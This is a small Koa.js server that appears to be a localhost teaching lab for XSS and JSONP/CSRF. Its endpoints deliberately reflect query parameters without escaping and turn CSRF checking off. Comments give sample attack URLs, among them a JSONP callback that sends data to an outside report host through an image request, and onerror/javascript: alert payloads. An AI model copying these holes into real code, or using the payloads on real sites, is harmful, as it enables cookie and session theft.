/*
 * @Author: kael 
 * @Date: 2018-08-10 23:03:47 
 * @Last Modified by: kael
 * @Last Modified time: 2018-08-11 14:08:19
 */

const Koa = require('koa');
const app = new Koa();

const csrf = require('./csrf')('2018121209234903240943094320932090982309');

app.use(async (ctx, next) => {
  console.log('url', ctx.url);
  switch (ctx.path) {
    // http://localhost:3000/jsonp.html?callback=console.log(document.cookie);void
    // http://localhost:3000/api/jsonp?callback=(new%20Image).src%3D%22http%3A%2F%2Fkael.com%3A3000%2Freport%3Fdata%3D%22%2BJSON.stringify
    case '/jsonp.html':
      ctx.type = 'html';
      ctx.cookies.set('SESSIONID', Math.random(), { httpOnly: false });
      ctx.body = `<body>
  <script>
    var csrf_token = "${csrf.create()}";
    var callback = (location.search.match(/callback=([\\w\\W]+)/i) || [])[1] || 'console.log'
    var $script = document.createElement('script');
    // $script.src = '/api/jsonp?callback=' + callback;
    $script.src = '/api/jsonp?token=' + csrf_token + '&callback=' + callback;
    document.body.appendChild($script);
  </script>
</body>`;
      break;
    case '/api/jsonp':
      let csrf_close = true;
      if (csrf_close || csrf.verify(ctx.query.token)) {
        ctx.type = 'js';
        ctx.body = `${ctx.query.callback}(${Math.random()})`;
      } else {
        ctx.status = 403;
        ctx.body = 'token error'
      }
      break;
    // http://localhost:3000/xss.html?href=javascript%3Aalert(1)
    case '/xss.html':
      ctx.type = 'html';
      let img_src = `https://www.baidu.com/img/bd_logo1.png`;
      // let img_src = `https://fuck.baidu.com/img.png" onerror="alert(1)`;
      ctx.body = require('fs').readFileSync('./xss.html').toString().replace('{{img_src}}', img_src);
      break;
    // http://localhost:3000/search?kw=hello
    // https://juejin.im/post/5912740344d904007b010252
    case '/search':
      ctx.type = 'html';
      // ctx.set('x-xss-protection', '0')
      // ctx.set('x-xss-protection', '1; mode=block')
      console.log('kw:', ctx.query.kw);
      ctx.body = `您搜索的关键词是: '${ctx.query.kw}'`;
      break;
    default:
      ctx.status = 204;
      ctx.body = '';
  }
});


app.listen(3000);
